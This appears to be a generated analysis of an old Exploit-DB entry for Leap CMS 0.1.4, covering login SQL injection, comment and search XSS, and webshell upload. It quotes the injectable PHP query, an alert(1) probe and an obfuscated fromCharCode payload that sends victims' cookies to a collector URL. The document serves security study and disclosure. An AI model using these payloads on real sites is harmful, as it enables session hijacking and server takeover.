Based on the provided content, here's an analysis of the vulnerabilities associated with CVE-2009-1614, as described in the Exploit-DB entry:

**Root Cause of Vulnerability:**

The Leap CMS 0.1.4 application has several vulnerabilities stemming from insufficient input validation and insecure coding practices.

**Weaknesses/Vulnerabilities Present:**

1.  **SQL Injection (Authentication Bypass):**
    *   **Vulnerability:**  The application is vulnerable to SQL injection in the login process. The `$_SESSION` variables are used directly in a SQL query without proper sanitization.
    *   **Code Snippet:**
        ```php
        $i=@mysql_query("SELECT * FROM ".db('prefix')."users WHERE mail='$_SESSION[userMail]' AND pwd='$_SESSION[passWord]'");
        ```
    *   **Weakness:** Lack of input sanitization allows an attacker to inject SQL code by manipulating the `$_SESSION[userMail]` variable
    *   **Condition:** `magic_quotes_gpc` must be off for successful exploitation.

2.  **Cross-Site Scripting (XSS) - Cookie Stealing:**
    *   **Vulnerability:** The comment feature is vulnerable to XSS.
    *   **Attack Vector:** By submitting a comment with a crafted JavaScript payload in the message field, an attacker can inject malicious code.
    *   **Payload:** `<script>document.location=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,101,120,112,108,111,105,116,45,99,111,111,107,105,101,115,47,119,97,105,116,105,110,103,45,102,111,114,46,112,104,112,63,99,107,61)+document.cookie</script>`
    *   **Impact:** This script redirects the victim to a URL controlled by the attacker, sending the victim's cookies, allowing session hijacking.
    *    **Condition:** The vulnerability is triggered by adding a comment to an article.

3.  **Arbitrary File Upload (Shell Upload):**
    *   **Vulnerability:** The "Manage Files" feature allows super administrators to upload arbitrary files.
    *   **Attack Vector:** An attacker who gains super administrator access via SQL injection can upload a malicious PHP script (webshell) using the file management interface.
    *   **Impact:** Once uploaded, the attacker can access the webshell, gain full control over the web server, and execute arbitrary commands.
    *   **Condition:** Requires super admin privileges to exploit (achieved through SQLi).

4.  **Cross-Site Scripting (XSS) - Search Form:**
    *   **Vulnerability:** The search functionality is vulnerable to XSS.
    *   **Attack Vector:**  By entering a malicious script into the search field, an attacker can execute arbitrary JavaScript code.
    *   **Payload:** `"><script>alert(1)</script>`

**Impact of Exploitation:**

*   **SQL Injection:** Complete authentication bypass, allowing unauthorized access to the application's administrative functions.
*   **XSS (Cookie Stealing):** Stealing user session cookies which can be used for session hijacking and impersonation.
*   **Arbitrary File Upload:** Full server compromise with arbitrary command execution capability.
*   **XSS (Search Form):** Execution of malicious JavaScript code within the context of the user's browser.

**Attack Vectors:**

*   **SQL Injection:** Through the login form by manipulating the email field.
*   **XSS (Cookie Stealing):**  Through the comment feature on article pages.
*   **Arbitrary File Upload:** Through the "Manage Files" option, requires admin access.
*   **XSS (Search Form):** Through the search form on the application.

**Required Attacker Capabilities/Position:**

*   **SQL Injection:** Requires a target application with magic quotes disabled, knowledge of the login form structure and SQL syntax.
*   **XSS (Cookie Stealing):** Requires the ability to post comments, some knowledge of javascript.
*   **Arbitrary File Upload:** Requires knowledge of the application structure, login details of a super admin, or prior successful exploitation of SQLi.
*  **XSS (Search Form):** Requires access to the application's search functionality.
